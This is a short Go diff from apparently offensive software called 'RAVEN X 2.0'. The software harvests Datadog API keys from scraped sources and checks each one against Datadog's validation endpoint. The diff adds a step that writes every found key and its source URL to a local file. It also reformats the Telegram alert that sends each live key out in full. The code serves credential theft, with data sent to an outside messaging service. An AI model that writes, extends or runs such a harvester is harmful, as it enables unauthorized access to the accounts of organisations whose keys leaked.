@@ -22,6 +22,8 @@ func (a *AWSScanner) CheckDatadog(key, sourceURL string) bool {
 	globalCounters.APIsFoundTotal++
 	globalCounters.mu.Unlock()
 
+	a.saveIntoFile(fmt.Sprintf("%s:%s", sourceURL, key), "datadog_found.txt")
+
 	req, err := http.NewRequest("GET", "https://api.datadoghq.com/api/v1/validate", nil)
 	if err != nil {
 		return false
@@ -51,13 +53,8 @@ func (a *AWSScanner) CheckDatadog(key, sourceURL string) bool {
 	globalCounters.APIsValidated++
 	globalCounters.mu.Unlock()
 
-	msg := fmt.Sprintf(`🔥 <b>RAVEN X 2.0 RESULT</b>
-━━━━━━━━━━━━━━━━━━
-🐶 <b>DATADOG LIVE KEY</b>
-
-🔑 <b>Key:</b> <code>%s</code>
-🔗 <b>Source:</b> %s
-`, key, sourceURL)
+	msg := a.tgHit("🐶", "DATADOG", sourceURL) + fmt.Sprintf(
+		"\n🔑 <b>Key:</b> <code>%s</code>\n", key)
 	go a.sendTelegram(msg)
 	return true
 }
